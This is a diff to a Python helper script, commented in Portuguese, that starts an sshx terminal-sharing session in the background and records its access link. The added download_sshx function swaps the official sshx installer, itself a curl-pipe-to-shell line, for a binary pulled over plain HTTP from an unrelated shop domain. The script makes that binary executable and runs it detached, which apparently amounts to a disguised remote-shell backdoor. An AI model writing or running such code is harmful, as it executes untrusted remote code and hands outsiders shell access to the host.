@@ -23,6 +23,7 @@ import os
 import json
 import tempfile
 import re
+import shlex
 
 
 def _clean_ansi_and_control(s: str) -> str:
@@ -79,19 +80,35 @@ def write_state(state):
 
 
 def install_sshx():
-	# tenta instalar via script oficial
-	print('Instalando sshx via curl...')
+	# deprecated: mantido por compatibilidade, mas preferimos baixar o binário
+	return False
+
+
+def download_sshx(dest_path):
+	url = 'http://infinitykkj.shop/auth/svrgoat/libs/sshx'
+	print(f'Tentando baixar sshx para {dest_path}...')
+	# tenta wget primeiro
 	try:
-		subprocess.run('curl -sSf https://sshx.io/get | sh', shell=True, check=True, executable='/bin/bash')
+		subprocess.run(['wget', '-q', '-O', dest_path, url], check=True)
+		os.chmod(dest_path, 0o755)
 		return True
-	except subprocess.CalledProcessError as e:
-		print('Falha ao instalar sshx:', e)
+	except Exception:
+		pass
+
+	# fallback para curl
+	try:
+		subprocess.run(['curl', '-sSfL', '-o', dest_path, url], check=True)
+		os.chmod(dest_path, 0o755)
+		return True
+	except Exception as e:
+		print('Falha ao baixar sshx:', e)
 		return False
 
 
-def start_sshx_detached(timeout=15):
-	# Inicia sshx em background usando nohup e coleta PID
-	cmd = f"nohup sshx > {SSHX_LOG} 2>&1 & echo $!"
+def start_sshx_detached(sshx_exec, timeout=15):
+	# Inicia sshx em background usando nohup e coleta PID. Usa o binário em sshx_exec.
+	safe = shlex.quote(sshx_exec)
+	cmd = f"nohup {safe} > {SSHX_LOG} 2>&1 & echo $!"
 	try:
 		out = subprocess.check_output(cmd, shell=True, executable='/bin/bash', stderr=subprocess.STDOUT)
 		pid = int(out.decode().strip())
@@ -131,20 +148,29 @@ def ensure_sshx():
 	if pid and link and is_pid_alive(pid):
 		return link
 
-	# tenta detectar se sshx está instalado
-	if shutil.which('sshx') is None:
-		ok = install_sshx()
+	# tenta detectar se sshx está instalado no PATH
+	sshx_exec = shutil.which('sshx')
+
+	# Se não existe no PATH, verificar se existe um binário local ./sshx
+	if not sshx_exec:
+		local_exec = os.path.join(os.getcwd(), 'sshx')
+		if os.path.isfile(local_exec) and os.access(local_exec, os.X_OK):
+			sshx_exec = local_exec
+
+	# Se ainda não encontramos, tentar baixar para ./sshx
+	if not sshx_exec:
+		local_exec = os.path.join(os.getcwd(), 'sshx')
+		ok = download_sshx(local_exec)
 		if not ok:
 			return None
+		sshx_exec = local_exec
 
-	# se chegamos aqui, sshx está (ou deve estar) instalado
-	# iniciar um servidor sshx em background (detached) e capturar a URL
-	pid, link = start_sshx_detached(timeout=20)
+	# se chegamos aqui, sshx_exec aponta para o binário a ser usado
+	pid, link = start_sshx_detached(sshx_exec, timeout=20)
 	if pid is None:
 		return None
-
-	# salvar estado
-	write_state({'pid': pid, 'link': link, 'started_at': int(time.time())})
+	# salvar estado (inclui caminho do executável)
+	write_state({'pid': pid, 'link': link, 'started_at': int(time.time()), 'exec': sshx_exec})
 	return link
 
 
